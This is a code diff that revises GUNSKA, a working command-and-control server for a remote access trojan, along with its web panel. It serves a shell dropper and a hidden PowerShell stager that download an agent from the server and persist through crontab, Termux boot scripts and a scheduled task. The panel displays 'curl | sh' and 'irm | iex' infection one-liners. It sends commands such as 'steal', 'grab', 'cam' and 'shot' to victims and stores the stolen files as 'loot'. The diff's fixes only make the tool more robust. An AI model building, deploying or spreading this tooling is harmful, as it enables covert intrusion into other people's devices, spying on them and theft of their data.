@@ -1,9 +1,26 @@
 #!/usr/bin/env python3
-import os, json, time, threading, secrets, base64, urllib.request
-from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
+"""GUNSKA — C2 server (stdlib only).
 
-PORT = int(os.environ.get("PORT", 8080))
+Fix list vs previous revision:
+  * agent now sends AGENT_TOKEN (?t=) and the server enforces it on /p and /r
+  * .leave / .detach are handled server-side (were executed in the victim shell)
+  * console got its output pump back (see console.py)
+  * dead sessions are garbage collected, output buffer is capped
+  * loot store is capped and evicts oldest entries
+  * do_HEAD implemented, /api/* answers are no-store, bad ?after= no longer 500s
+  * panel rewritten from scratch
+"""
+import base64
+import json
+import os
+import secrets
+import threading
+import time
+import urllib.request
+from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
+from urllib.parse import parse_qs, urlparse
+
+PORT = int(os.environ.get("PORT", "8080"))
 AUTH = os.environ.get("AUTH") or secrets.token_hex(12)
 TOKEN = os.environ.get("AGENT_TOKEN") or secrets.token_hex(12)
 BASE = os.environ.get("BASE_URL", "").rstrip("/")
@@ -11,51 +28,84 @@ BASE = os.environ.get("BASE_URL", "").rstrip("/")
 LOCK = threading.RLock()
 S = {}
 LOOT = {}
+LOOT_ORDER = []
+LOOT_BYTES = 0
+
+MAX_LOOT_BYTES = 200 * 1024 * 1024
+MAX_OUT = 5000
+POLL_HOLD = 25
+OFFLINE_AFTER = 90
+SESSION_TTL = 86400
+
 
 def base_of(h):
-    if BASE: return BASE
+    if BASE:
+        return BASE
     proto = h.headers.get("X-Forwarded-Proto", "https")
     return "%s://%s" % (proto, h.headers.get("Host", "localhost"))
 
+
 def sess(sid):
     with LOCK:
-        if sid not in S:
-            S[sid] = {"info": {}, "last": time.time(), "q": [], "out": [], "seq": 0, "up": {}}
-        S[sid]["last"] = time.time()
-        return S[sid]
+        s = S.get(sid)
+        if s is None:
+            s = S[sid] = {"info": {}, "last": time.time(), "q": [], "out": [], "seq": 0, "up": {}}
+        s["last"] = time.time()
+        return s
 
-AGENT = open("agent.py").read() if os.path.exists("agent.py") else ""
+
+AGENT = ""
+if os.path.exists("agent.py"):
+    with open("agent.py", encoding="utf-8") as _f:
+        AGENT = _f.read()
+
 
 def agent_src(host):
     return (AGENT.replace("__BASE__", base_of(host))
                  .replace("__TOKEN__", TOKEN)
                  .replace("__NAME__", "k" + secrets.token_hex(3)))
 
-SIMPLE = {"info": "info", "ps": "ps", "shot": "shot", "cam": "cam", "pwd": "pwd",
-          "steal": "steal", "grab": "grab", "persist": "persist",
-          "unpersist": "unpersist", "sd": "sd", "py": "py",
-          "toast": "toast", "vibrate": "vibrate", "audio": "audio"}
+
+SIMPLE = {"info", "ps", "shot", "cam", "pwd", "steal", "grab", "persist",
+          "unpersist", "sd", "kill", "py", "toast", "vibrate", "audio", "leave"}
+
 
 def to_agent(line):
+    """Map one console/panel line to an agent message."""
     rid = secrets.token_hex(4)
+    line = line.strip()
+    if not line:
+        return {"t": "noop", "id": rid}
     if not line.startswith("."):
         return {"t": "shell", "id": rid, "a": line}
-    b = line[1:].split(None, 1)
-    c = b[0].lower() if b else ""
-    a = b[1] if len(b) > 1 else ""
-    if c == "cd":   return {"t": "cd", "id": rid, "a": a or "~"}
-    if c == "ls":   return {"t": "ls", "id": rid, "a": a}
-    if c == "get":  return {"t": "get", "id": rid, "a": a}
-    if c == "clip": return {"t": "clip", "id": rid, "op": "set" if a else "get", "a": a}
-    if c in SIMPLE: return {"t": SIMPLE[c], "id": rid, "a": a}
+
+    parts = line[1:].split(None, 1)
+    c = parts[0].lower() if parts else ""
+    a = parts[1] if len(parts) > 1 else ""
+
+    if c in ("leave", "detach"):
+        return {"t": "noop", "id": rid}
+    if c == "cd":
+        return {"t": "cd", "id": rid, "a": a or "~"}
+    if c == "ls":
+        return {"t": "ls", "id": rid, "a": a}
+    if c == "get":
+        return {"t": "get", "id": rid, "a": a}
+    if c == "clip":
+        return {"t": "clip", "id": rid, "op": "set" if a else "get", "a": a}
+    if c in SIMPLE:
+        return {"t": c, "id": rid, "a": a}
     return {"t": "shell", "id": rid, "a": line}
+
 
 BSH = r"""#!/bin/sh
 B="__B__"; D="$HOME/.cache/.k"
 mkdir -p "$D" 2>/dev/null
 command -v python3 >/dev/null || { command -v pkg >/dev/null && pkg install -y python >/dev/null 2>&1; }
 command -v python3 >/dev/null || { command -v apt >/dev/null && (apt update -qq; apt install -y python3) >/dev/null 2>&1; }
+command -v python3 >/dev/null || { echo "python3 missing"; exit 1; }
 curl -fsSL "$B/a" -o "$D/k.py" 2>/dev/null || wget -q "$B/a" -O "$D/k.py"
+[ -s "$D/k.py" ] || { echo "payload fetch failed"; exit 1; }
 command -v termux-wake-lock >/dev/null && termux-wake-lock
 nohup python3 "$D/k.py" >/dev/null 2>&1 &
 if [ -d "$HOME/.termux" ]; then
@@ -63,8 +113,10 @@ if [ -d "$HOME/.termux" ]; then
   printf '#!/data/data/com.termux/files/usr/bin/sh\nnohup python3 %s >/dev/null 2>&1 &\n' "$D/k.py" > "$HOME/.termux/boot/svc.sh"
   chmod +x "$HOME/.termux/boot/svc.sh"
 fi
-(command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -q k.py) || \
-  (command -v crontab >/dev/null && (crontab -l 2>/dev/null; echo "@reboot nohup python3 $D/k.py >/dev/null 2>&1 &") | crontab)
+if command -v crontab >/dev/null; then
+  crontab -l 2>/dev/null | grep -q '\.cache/\.k/k\.py' || \
+    (crontab -l 2>/dev/null; echo "@reboot nohup python3 $D/k.py >/dev/null 2>&1 & # gunska") | crontab
+fi
 echo "[+] done"
 """
 
@@ -78,90 +130,413 @@ Start-Process -WindowStyle Hidden -FilePath $py -ArgumentList "`"$d\k.py`""
 schtasks /create /tn SysSvc /tr "`"$py`" `"$d\k.py`"" /sc onlogon /f | Out-Null
 """
 
-PANEL = r"""<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>C2</title>
+PANEL = r"""<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>GUNSKA · C2</title>
 <style>
-body{background:#0d1117;color:#c9d1d9;font:13px ui-monospace,monospace;margin:0;padding:10px}
-#h{display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin-bottom:8px}
-input,button{background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:5px;font:inherit}
-button{cursor:pointer}#s div{padding:3px;border-bottom:1px solid #21262d;cursor:pointer}
-#s div:hover{background:#161b22}#t{height:45vh;overflow:auto;background:#010409;padding:6px;white-space:pre-wrap;border:1px solid #21262d}
-#c{width:100%;box-sizing:border-box;margin-top:6px}#l div{padding:2px}
-.ok{color:#3fb950}.off{color:#8b949e}#lk{font-size:11px;margin-bottom:8px}
-code{background:#010409;padding:2px 4px}
-</style>
-<div id=h><b>C2</b><input id=k placeholder="AUTH key" size=20><button onclick=save()>connect</button>
-<button onclick="links()">links</button><button onclick="cmd('.steal')">steal</button>
-<button onclick="cmd('.shot')">shot</button><button onclick="cmd('.info')">info</button>
-<button onclick="q('#f').click()">put</button><input type=file id=f style=display:none onchange=up()></div>
-<div id=lk></div>
-<div id=s></div><div id=t></div><input id=c placeholder="commande (. = RAT cmd)" onkeydown="if(event.key=='Enter')run()">
-<div id=l></div>
-<script>
-let K=localStorage.k||'',cur=null,seq=0,t1,t2;
-const q=s=>document.querySelector(s);
-function save(){K=q('#k').value;localStorage.k=K;poll()}
-async function api(p,o){o=o||{};o.headers=Object.assign({'X-Auth':K},o.headers||{});return fetch(p,o)}
-function cmd(c){if(!cur)return;api('/api/cmd',{method:'POST',body:JSON.stringify({sid:cur,cmd:c})})}
-function run(){const v=q('#c').value;if(!v||!cur)return;q('#c').value='';cmd(v)}
-async function up(){const f=q('#f').files[0];if(!f||!cur)return;
- await api('/api/put',{method:'POST',body:f,headers:{'X-Sid':cur,'X-Name':f.name}});
- q('#t').textContent+='[sent] '+f.name+'\n';q('#f').value=''}
-function links(){const o=location.origin;
- q('#lk').innerHTML='<div><b>linux</b> <code>curl -fsSL '+o+'/i | sh</code> <button onclick="cp(this)">copy</button></div>'+
- '<div><b>windows</b> <code>powershell -w hidden -c "irm '+o+'/i.ps1 | iex"</code> <button onclick="cp(this)">copy</button></div>'}
-function cp(b){navigator.clipboard.writeText(b.previousElementSibling.textContent)}
-async function poll(){
- clearInterval(t1);clearInterval(t2);
- t1=setInterval(async()=>{
-  if(!K)return;try{const r=await api('/api/sessions');const j=await r.json();
-  q('#s').innerHTML=j.map(s=>`<div class="${s.on?'ok':'off'}" onclick="sel('${s.id}')">${s.on?'*':'-'} ${s.id} ${s.user}@${s.host} ${s.ip} ${s.os}</div>`).join('')||'<i>no sessions</i>'}catch(e){}
- },2500);
- t2=setInterval(async()=>{
-  if(!K||!cur)return;try{const r=await api('/api/out?sid='+cur+'&after='+seq);const j=await r.json();
-  if(j.lines.length){seq=j.seq;q('#t').textContent+=j.lines.join('');q('#t').scrollTop=1e9}}catch(e){}
- },700);
- try{const r=await api('/api/loot');const j=await r.json();
- q('#l').innerHTML='<b>loot</b>'+j.map(f=>`<div><a href="/api/loot/${f.id}?k=${K}" style="color:#58a6ff">${f.name}</a> ${f.size}b</div>`).join('')}catch(e){}
+:root{
+  --bg:#0a0c10; --bg2:#0e1218; --card:#11151c; --card2:#151b24;
+  --line:#1e2530; --line2:#2a3442;
+  --fg:#d7dde5; --dim:#7d8896; --faint:#4d5763;
+  --acc:#4f9dff; --ok:#3fb950; --warn:#d29922; --err:#f85149;
+  --r:10px; --rs:6px;
 }
-function sel(id){cur=id;seq=0;q('#t').textContent='';q('#c').focus()}
-q('#k').value=K;if(K)poll();
-</script>"""
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0; background:var(--bg); color:var(--fg);
+  font:14px/1.5 Inter,-apple-system,"Segoe UI",Roboto,system-ui,sans-serif;
+  -webkit-font-smoothing:antialiased; display:flex; flex-direction:column;
+}
+button,input{font:inherit; color:inherit}
+::-webkit-scrollbar{width:9px;height:9px}
+::-webkit-scrollbar-thumb{background:#222b36;border-radius:9px}
+::-webkit-scrollbar-thumb:hover{background:#31404f}
+::-webkit-scrollbar-track{background:transparent}
+
+header{
+  display:flex; align-items:center; gap:10px; flex-wrap:wrap;
+  padding:10px 14px; border-bottom:1px solid var(--line); background:var(--bg2);
+}
+.brand{display:flex; align-items:center; gap:8px; font-weight:600; letter-spacing:.16em; font-size:13px}
+.brand i{width:8px;height:8px;border-radius:50%;background:var(--acc);box-shadow:0 0 0 3px rgba(79,157,255,.15)}
+.brand em{font-style:normal;font-size:9px;letter-spacing:.1em;color:var(--dim);border:1px solid var(--line2);padding:2px 5px;border-radius:4px}
+.spacer{flex:1}
+.keybox{display:flex; gap:6px; align-items:center}
+input[type=password],input[type=text]{
+  background:#0b0f15; border:1px solid var(--line2); border-radius:var(--rs);
+  padding:7px 10px; outline:none; transition:border-color .15s, box-shadow .15s; min-width:0;
+}
+input:focus{border-color:var(--acc); box-shadow:0 0 0 3px rgba(79,157,255,.12)}
+input::placeholder{color:var(--faint)}
+.btn{
+  background:var(--card2); border:1px solid var(--line2); border-radius:var(--rs);
+  padding:7px 12px; cursor:pointer; transition:.15s; white-space:nowrap; font-size:13px;
+}
+.btn:hover{background:#1b2431; border-color:#33445a}
+.btn:active{transform:translateY(1px)}
+.btn.primary{background:#1b4b86; border-color:#2b6db8; color:#e8f1ff}
+.btn.primary:hover{background:#215a9f}
+.btn.xs{padding:3px 8px; font-size:11px; color:var(--dim)}
+.btn.xs:hover{color:var(--fg)}
+.chip{
+  font-size:11px; padding:3px 9px; border-radius:999px; border:1px solid var(--line2);
+  color:var(--dim); background:var(--card); display:flex; align-items:center; gap:6px;
+}
+.chip b{width:6px;height:6px;border-radius:50%;background:var(--faint)}
+.chip.on{color:var(--ok); border-color:#1d3b26; background:#0f1a12}
+.chip.on b{background:var(--ok)}
+.chip.bad{color:var(--err); border-color:#3d1f1f; background:#1a0f0f}
+.chip.bad b{background:var(--err)}
+
+main{flex:1; display:grid; grid-template-columns:230px minmax(0,1fr) 250px; gap:10px; padding:10px; min-height:0}
+.col{display:flex; flex-direction:column; min-height:0; background:var(--card); border:1px solid var(--line); border-radius:var(--r); overflow:hidden}
+.colhead{display:flex; align-items:center; gap:8px; padding:9px 11px; border-bottom:1px solid var(--line)}
+.colhead h2{margin:0; font-size:10px; letter-spacing:.14em; text-transform:uppercase; color:var(--dim); font-weight:600}
+.badge{font-size:10px; color:var(--dim); background:var(--card2); border-radius:999px; padding:1px 7px}
+.list{overflow:auto; padding:6px; flex:1; min-height:0}
+.search{margin:8px; padding:6px 9px; font-size:12px}
+
+.s{display:block; width:100%; text-align:left; background:none; border:1px solid transparent; border-radius:var(--rs); padding:7px 9px; cursor:pointer; transition:.12s}
+.s:hover{background:var(--card2); border-color:var(--line2)}
+.s.sel{background:#132234; border-color:#27506f}
+.s .top{display:flex; align-items:center; gap:6px; font-family:ui-monospace,monospace; font-size:11.5px}
+.s .dot{width:6px;height:6px;border-radius:50%;background:var(--faint);flex:none}
+.s.on .dot{background:var(--ok); box-shadow:0 0 6px rgba(63,185,80,.6)}
+.s .meta{color:var(--dim); font-size:10.5px; margin-left:12px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap}
+.empty{color:var(--faint); font-size:12px; padding:10px; text-align:center}
+
+.term{padding:0}
+.out{
+  flex:1; margin:0; overflow:auto; padding:11px 13px; background:#05070a;
+  font:12px/1.65 ui-monospace,SFMono-Regular,Menlo,monospace;
+  white-space:pre-wrap; word-break:break-word; outline:none; min-height:0;
+}
+.out .ln{display:block}
+.out .loot{color:var(--acc)}
+.out .rc{color:var(--faint)}
+.out .err{color:var(--err)}
+.out .sys{color:var(--warn)}
+.inputrow{display:flex; gap:7px; align-items:center; padding:9px; border-top:1px solid var(--line); background:var(--card)}
+.inputrow .caret{color:var(--acc); font-family:ui-monospace,monospace; font-weight:700}
+.inputrow input{flex:1; font-family:ui-monospace,monospace; font-size:12.5px}
+
+.loot{font-size:12px}
+.loot a{color:var(--acc); text-decoration:none; display:block; padding:6px 8px; border-radius:var(--rs); overflow:hidden; text-overflow:ellipsis; white-space:nowrap}
+.loot a:hover{background:var(--card2)}
+.loot .sz{color:var(--faint); font-size:10px; margin-left:8px}
+.links{padding:9px; display:flex; flex-direction:column; gap:7px; font-size:11px}
+.links code{display:block; background:#05070a; border:1px solid var(--line); border-radius:var(--rs); padding:7px 8px; font-family:ui-monospace,monospace; word-break:break-all; color:#9fd0a8; font-size:10.5px}
+
+.toasts{position:sticky; bottom:0; display:flex; flex-direction:column; gap:6px; padding:0 12px 10px; pointer-events:none}
+.toast{background:var(--card2); border:1px solid var(--line2); border-left:3px solid var(--acc); border-radius:var(--rs); padding:7px 11px; font-size:12px; animation:in .18s ease-out}
+.toast.bad{border-left-color:var(--err)}
+.toast.good{border-left-color:var(--ok)}
+@keyframes in{from{opacity:0; transform:translateY(6px)}to{opacity:1; transform:none}}
+
+@media (max-width:980px){
+  main{grid-template-columns:1fr; grid-template-rows:auto 1fr auto}
+  .col.sessions .list{max-height:150px}
+  .col.side{flex-direction:row; flex-wrap:wrap}
+  .col.side>*{flex:1; min-width:150px}
+}
+</style>
+</head>
+<body>
+<header>
+  <div class="brand"><i></i>GUNSKA<em>C2</em></div>
+  <div class="spacer"></div>
+  <div class="keybox">
+    <input id="k" type="password" placeholder="AUTH key" size="22" autocomplete="off" spellcheck="false">
+    <button class="btn primary" id="conn">connect</button>
+  </div>
+  <span class="chip" id="status"><b></b>idle</span>
+</header>
+<main>
+  <section class="col sessions">
+    <div class="colhead"><h2>sessions</h2><span class="badge" id="count">0</span></div>
+    <input class="search" id="search" placeholder="filter host / ip / os" autocomplete="off">
+    <div class="list" id="slist"><div class="empty">not connected</div></div>
+  </section>
+  <section class="col term">
+    <div class="colhead">
+      <h2 id="ttl">no session</h2>
+      <div class="spacer"></div>
+      <button class="btn xs" data-c=".info">info</button>
+      <button class="btn xs" data-c=".steal">steal</button>
+      <button class="btn xs" data-c=".shot">shot</button>
+      <button class="btn xs" data-c=".leave">detach</button>
+      <button class="btn xs" id="clear">clear</button>
+    </div>
+    <pre class="out" id="t" tabindex="0"></pre>
+    <div class="inputrow">
+      <span class="caret">&gt;</span>
+      <input id="c" placeholder="shell command — prefix with . for RAT commands" autocomplete="off" spellcheck="false">
+      <button class="btn primary" id="run">run</button>
+      <button class="btn" id="put">put</button>
+      <input type="file" id="f" hidden>
+    </div>
+  </section>
+  <section class="col side">
+    <div class="colhead"><h2>loot</h2></div>
+    <div class="list loot" id="loot"><div class="empty">empty</div></div>
+    <div class="colhead"><h2>links</h2></div>
+    <div class="links" id="links"><div class="empty">connect first</div></div>
+  </section>
+</main>
+<div class="toasts" id="toasts"></div>
+<script>
+const $ = s => document.querySelector(s);
+const esc = s => String(s == null ? "" : s).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+
+let K = localStorage.getItem("gs_key") || "";
+let cur = null, seq = 0, tSess = null, tOut = null, tLoot = null;
+const SLIST = $("#slist"), T = $("#t"), LOOT = $("#loot"), STATUS = $("#status");
+
+function setStatus(kind, text){
+  STATUS.className = "chip" + (kind ? " " + kind : "");
+  STATUS.innerHTML = "<b></b>" + esc(text);
+}
+function toast(msg, kind){
+  const d = document.createElement("div");
+  d.className = "toast" + (kind ? " " + kind : "");
+  d.textContent = msg;
+  $("#toasts").appendChild(d);
+  setTimeout(() => d.remove(), 3200);
+}
+function api(path, opts){
+  opts = opts || {};
+  opts.headers = Object.assign({"X-Auth": K}, opts.headers || {});
+  return fetch(path, opts);
+}
+function write(line, cls){
+  const near = T.scrollHeight - T.scrollTop - T.clientHeight < 60;
+  const el = document.createElement("span");
+  el.className = "ln" + (cls ? " " + cls : "");
+  el.textContent = line;
+  T.appendChild(el);
+  while (T.childElementCount > 4000) T.firstElementChild.remove();
+  if (near) T.scrollTop = T.scrollHeight;
+}
+
+async function connect(){
+  K = $("#k").value.trim();
+  if (!K) { toast("key khawi", "bad"); return; }
+  localStorage.setItem("gs_key", K);
+  setStatus("", "connecting");
+  try {
+    const r = await api("/api/sessions");
+    if (r.status === 401) { setStatus("bad", "bad key"); toast("401 — key ghalta", "bad"); return; }
+    setStatus("on", "live");
+    drawLinks();
+    start();
+  } catch (e) { setStatus("bad", "unreachable"); toast("ma 9dertch nwsel", "bad"); }
+}
+
+function start(){
+  stop();
+  pollSessions(); pollLoot();
+  tSess = setInterval(pollSessions, 2500);
+  tOut = setInterval(pollOut, 700);
+  tLoot = setInterval(pollLoot, 4000);
+}
+function stop(){
+  clearInterval(tSess); clearInterval(tOut); clearInterval(tLoot);
+}
+
+async function pollSessions(){
+  if (!K) return;
+  try {
+    const r = await api("/api/sessions");
+    if (r.status === 401) { setStatus("bad", "bad key"); stop(); return; }
+    const j = await r.json();
+    setStatus("on", "live");
+    $("#count").textContent = j.length;
+    const q = $("#search").value.trim().toLowerCase();
+    const rows = j.filter(s => !q || [s.id, s.user, s.host, s.ip, s.os].join(" ").toLowerCase().includes(q));
+    SLIST.innerHTML = rows.length ? "" : '<div class="empty">no match</div>';
+    for (const s of rows){
+      const b = document.createElement("button");
+      b.className = "s" + (s.on ? " on" : "") + (s.id === cur ? " sel" : "");
+      b.innerHTML = '<div class="top"><span class="dot"></span>' + esc(s.id) + '</div>'
+        + '<div class="meta">' + esc(s.user || "?") + '@' + esc(s.host || "?") + '</div>'
+        + '<div class="meta">' + esc(s.ip || "?") + ' · ' + esc(s.os || "?") + '</div>';
+      b.onclick = () => select(s.id);
+      SLIST.appendChild(b);
+    }
+  } catch (e) {}
+}
+
+async function pollOut(){
+  if (!K || !cur) return;
+  try {
+    const r = await api("/api/out?sid=" + encodeURIComponent(cur) + "&after=" + seq);
+    if (!r.ok) return;
+    const j = await r.json();
+    if (j.lines && j.lines.length){
+      seq = j.seq;
+      for (const line of j.lines){
+        if (/^\[loot\]/.test(line)) write(line, "loot");
+        else if (/^\[rc=/.test(line)) write(line, "rc");
+        else if (/^ERR /.test(line)) write(line, "err");
+        else write(line);
+      }
+    }
+  } catch (e) {}
+}
+
+async function pollLoot(){
+  if (!K) return;
+  try {
+    const r = await api("/api/loot");
+    if (!r.ok) return;
+    const j = await r.json();
+    LOOT.innerHTML = j.length ? "" : '<div class="empty">empty</div>';
+    for (const f of j){
+      const a = document.createElement("a");
+      a.href = "/api/loot/" + encodeURIComponent(f.id) + "?k=" + encodeURIComponent(K);
+      a.innerHTML = esc(f.name) + '<span class="sz">' + Math.round(f.size / 1024) + " KB</span>";
+      LOOT.appendChild(a);
+    }
+  } catch (e) {}
+}
+
+function select(id){
+  if (cur === id) return;
+  cur = id; seq = 0;
+  T.textContent = "";
+  $("#ttl").textContent = id;
+  $("#c").focus();
+  pollSessions();
+}
+
+async function send(cmd){
+  if (!cur) { toast("khtar session 3la l9bel", "bad"); return; }
+  try {
+    const r = await api("/api/cmd", {method: "POST", body: JSON.stringify({sid: cur, cmd})});
+    if (!r.ok) toast("cmd refusé (" + r.status + ")", "bad");
+    if (/^\.(leave|detach)\b/.test(cmd)) { cur = null; $("#ttl").textContent = "no session"; }
+  } catch (e) { toast("cmd failed", "bad"); }
+}
+function sendInput(){
+  const v = $("#c").value.trim();
+  if (!v) return;
+  $("#c").value = "";
+  write("$ " + v, "sys");
+  send(v);
+}
+
+async function upload(){
+  const f = $("#f").files[0];
+  if (!f || !cur) return;
+  toast("sending " + f.name + "…");
+  try {
+    const r = await api("/api/put", {method: "POST", body: f, headers: {"X-Sid": cur, "X-Name": f.name}});
+    write(r.ok ? "[sent] " + f.name : "[put failed] " + f.name, r.ok ? "loot" : "err");
+  } catch (e) { write("[put failed] " + f.name, "err"); }
+  $("#f").value = "";
+}
+
+function drawLinks(){
+  const o = location.origin;
+  $("#links").innerHTML =
+    '<div>linux / termux</div><code>curl -fsSL ' + esc(o) + '/i | sh</code>' +
+    '<div>windows</div><code>powershell -w hidden -c "irm ' + esc(o) + '/i.ps1 | iex"</code>';
+  for (const c of document.querySelectorAll(".links code")){
+    c.title = "click to copy";
+    c.style.cursor = "pointer";
+    c.onclick = () => { navigator.clipboard.writeText(c.textContent).then(() => toast("copied", "good")); };
+  }
+}
+
+$("#conn").onclick = connect;
+$("#k").addEventListener("keydown", e => { if (e.key === "Enter") connect(); });
+$("#run").onclick = sendInput;
+$("#clear").onclick = () => { T.textContent = ""; };
+$("#put").onclick = () => $("#f").click();
+$("#f").onchange = upload;
+$("#c").addEventListener("keydown", e => { if (e.key === "Enter") sendInput(); });
+$("#search").addEventListener("input", pollSessions);
+document.querySelectorAll("[data-c]").forEach(b => b.onclick = () => send(b.dataset.c));
+document.addEventListener("keydown", e => {
+  if (e.key === "Escape") { $("#c").value = ""; $("#c").blur(); }
+  if (e.key === "/" && document.activeElement.tagName !== "INPUT") { e.preventDefault(); $("#search").focus(); }
+});
+
+$("#k").value = K;
+if (K) connect();
+</script>
+</body>
+</html>"""
+
 
 class H(BaseHTTPRequestHandler):
     protocol_version = "HTTP/1.1"
+    server_version = "gunska"
 
-    def log_message(self, *a): pass
+    def log_message(self, *a):
+        pass
 
     def snd(self, code, body, ctype="text/plain; charset=utf-8", extra=None):
-        if isinstance(body, str): body = body.encode()
+        if isinstance(body, str):
+            body = body.encode()
         self.send_response(code)
         self.send_header("Content-Type", ctype)
         self.send_header("Content-Length", str(len(body)))
-        for k, v in (extra or {}).items(): self.send_header(k, v)
+        self.send_header("Cache-Control", "no-store")
+        self.send_header("X-Content-Type-Options", "nosniff")
+        for k, v in (extra or {}).items():
+            self.send_header(k, v)
         self.end_headers()
-        try: self.wfile.write(body)
-        except Exception: pass
+        if self.command != "HEAD":
+            try:
+                self.wfile.write(body)
+            except Exception:
+                pass
 
     def auth(self):
-        if self.headers.get("X-Auth") == AUTH: return True
-        if parse_qs(urlparse(self.path).query).get("k", [""])[0] == AUTH: return True
-        self.snd(401, "unauthorized"); return False
+        given = self.headers.get("X-Auth")
+        if given and secrets.compare_digest(given, AUTH):
+            return True
+        qk = parse_qs(urlparse(self.path).query).get("k", [""])[0]
+        if qk and secrets.compare_digest(qk, AUTH):
+            return True
+        self.snd(401, "unauthorized")
+        return False
+
+    def agent_ok(self, qs):
+        given = qs.get("t", [""])[0]
+        return bool(given) and secrets.compare_digest(given, TOKEN)
 
     def body(self):
         n = int(self.headers.get("Content-Length") or 0)
         return self.rfile.read(n) if n else b""
 
+    # ------------------------------------------------------------------ GET
     def do_GET(self):
-        u = urlparse(self.path); p = u.path; qs = parse_qs(u.query)
+        u = urlparse(self.path)
+        p, qs = u.path, parse_qs(u.query)
 
-        if p == "/healthz": return self.snd(200, "ok")
-        if p == "/": return self.snd(200, PANEL, "text/html; charset=utf-8")
-        if p == "/i": return self.snd(200, BSH.replace("__B__", base_of(self)), "text/x-shellscript")
-        if p == "/i.ps1": return self.snd(200, PSH.replace("__B__", base_of(self)), "text/plain")
-        if p == "/a": return self.snd(200, agent_src(self), "text/x-python")
+        if p == "/healthz":
+            return self.snd(200, "ok")
+        if p == "/favicon.ico":
+            return self.snd(204, b"", "image/x-icon")
+        if p == "/":
+            return self.snd(200, PANEL, "text/html; charset=utf-8")
+        if p == "/i":
+            return self.snd(200, BSH.replace("__B__", base_of(self)), "text/x-shellscript")
+        if p == "/i.ps1":
+            return self.snd(200, PSH.replace("__B__", base_of(self)), "text/plain")
+        if p == "/a":
+            return self.snd(200, agent_src(self), "text/x-python")
 
         if p == "/link":
-            if not self.auth(): return
+            if not self.auth():
+                return
             o = base_of(self)
             return self.snd(200, "linux:  curl -fsSL %s/i | sh\nwindows: powershell -w hidden -c \"irm %s/i.ps1 | iex\"\n" % (o, o))
 
@@ -170,102 +545,180 @@ class H(BaseHTTPRequestHandler):
                 r = urllib.request.Request(
                     "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip",
                     headers={"User-Agent": "Mozilla/5.0"})
-                with urllib.request.urlopen(r, timeout=120) as f: d = f.read()
-                return self.snd(200, d, "application/zip")
-            except Exception as e: return self.snd(502, "py fetch: %s" % e)
+                with urllib.request.urlopen(r, timeout=120) as f:
+                    return self.snd(200, f.read(), "application/zip")
+            except Exception as e:
+                return self.snd(502, "py fetch: %s" % e)
 
         if p.startswith("/p/"):
-            sid = p[3:]
-            if qs.get("t", [""])[0] not in ("", TOKEN): return self.snd(403, "bad token")
+            if not self.agent_ok(qs):
+                return self.snd(403, "bad token")
+            sid = p[3:].strip("/")
+            if not sid:
+                return self.snd(400, "sid")
             s = sess(sid)
-            end = time.time() + 25
+            end = time.time() + POLL_HOLD
             while time.time() < end:
                 with LOCK:
                     if s["q"]:
-                        c = s["q"]; s["q"] = []
-                        return self.snd(200, json.dumps({"c": c}), "application/json")
+                        batch = s["q"]
+                        s["q"] = []
+                        return self.snd(200, json.dumps({"c": batch}), "application/json")
                 time.sleep(0.15)
             return self.snd(200, '{"c":[]}', "application/json")
 
         if p.startswith("/api/"):
-            if not self.auth(): return
+            if not self.auth():
+                return
+
             if p == "/api/sessions":
                 now = time.time()
                 with LOCK:
-                    j = [{"id": k, "on": now - v["last"] < 90, "user": v["info"].get("user"),
-                          "host": v["info"].get("host"), "ip": v["info"].get("ip"),
-                          "os": (v["info"].get("os") or "")[:40]} for k, v in S.items()]
+                    j = [{"id": k, "on": now - v["last"] < OFFLINE_AFTER,
+                          "user": v["info"].get("user"), "host": v["info"].get("host"),
+                          "ip": v["info"].get("ip"), "os": (v["info"].get("os") or "")[:40]}
+                         for k, v in S.items()]
+                j.sort(key=lambda x: (not x["on"], x["id"]))
                 return self.snd(200, json.dumps(j), "application/json")
+
             if p == "/api/out":
-                sid = qs.get("sid", [""])[0]; after = int(qs.get("after", ["0"])[0])
+                sid = qs.get("sid", [""])[0]
+                try:
+                    after = int(qs.get("after", ["0"])[0])
+                except ValueError:
+                    after = 0
                 with LOCK:
-                    s = S.get(sid, {"out": [], "seq": 0})
+                    s = S.get(sid)
+                    if s is None:
+                        return self.snd(200, '{"lines":[],"seq":0}', "application/json")
                     lines = [t for i, t in s["out"] if i > after]
-                return self.snd(200, json.dumps({"lines": lines, "seq": s["seq"]}), "application/json")
+                    seq = s["seq"]
+                return self.snd(200, json.dumps({"lines": lines, "seq": seq}), "application/json")
+
             if p == "/api/loot":
                 with LOCK:
                     j = [{"id": k, "name": v["name"], "size": v["size"]} for k, v in LOOT.items()]
                 return self.snd(200, json.dumps(j), "application/json")
-            if p.startswith("/api/loot/"):
-                with LOCK: f = LOOT.get(p.split("/")[-1])
-                if not f: return self.snd(404, "nope")
-                return self.snd(200, f["data"], "application/octet-stream",
-                                {"Content-Disposition": 'attachment; filename="%s"' % f["name"]})
-            return self.snd(404, "?")
-        self.snd(404, "?")
 
+            if p.startswith("/api/loot/"):
+                fid = p.split("/")[-1]
+                with LOCK:
+                    f = LOOT.get(fid)
+                if not f:
+                    return self.snd(404, "nope")
+                safe = f["name"].replace('"', "_")
+                return self.snd(200, f["data"], "application/octet-stream",
+                                {"Content-Disposition": 'attachment; filename="%s"' % safe})
+
+            return self.snd(404, "?")
+
+        return self.snd(404, "?")
+
+    def do_HEAD(self):
+        self.do_GET()
+
+    # ----------------------------------------------------------------- POST
     def do_POST(self):
-        u = urlparse(self.path); p = u.path
+        u = urlparse(self.path)
+        p, qs = u.path, parse_qs(u.query)
 
         if p.startswith("/r/"):
-            sid = p[3:]
-            if parse_qs(u.query).get("t", [""])[0] not in ("", TOKEN): return self.snd(403, "bad token")
